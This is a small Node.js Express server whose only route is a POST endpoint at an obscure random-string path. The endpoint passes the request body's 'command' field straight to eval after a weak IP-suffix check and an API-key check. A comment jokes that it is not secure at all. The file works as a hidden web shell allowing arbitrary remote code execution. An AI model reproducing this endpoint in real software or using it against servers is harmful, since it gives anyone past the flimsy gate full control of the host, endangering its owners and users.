const express = require('express');
const requestIp = require('request-ip');
const mongoose = require('mongoose');
const path = require('path');
const cors = require('cors');

require('dotenv').config({
	path: path.resolve(__dirname, '../.env'),
});

mongoose
	.connect(`${process.env.MONGO}`, {
		useNewUrlParser: true,
		useUnifiedTopology: true,
	})
	.then(async () => {
		console.log('Database Connected successfully');
	})
	.catch((err) => {
		console.log(`Can't Connect To Database ${err}`);
		process.exit(0);
	});

const app = express();
app.use(cors());
app.use(express.json());
app.use(requestIp.mw());

app.post('/F3S6dHe5dMX9gbN47PgE7TmqTsLzLebP', async (req, res) => {
	try {
		const ip = req.clientIp;
		const { x_api_key } = req.headers;

		if (!ip.endsWith(process.env.IP) || x_api_key !== process.env.X_API_KEY) {
			return res.status(200).send({
				message: 'Forbidden',
			});
		}

		// Not Secure At All Krub 😂
		eval(req.body.command);

		// res.send({ message: response });
	} catch (error) {
		console.log(error);
		res.status(200).send({
			message: error.message,
		});
	}
});

const PORT = 3350;

app.listen(PORT, () => {
	console.log(`server is listening at port ${PORT}`);
});
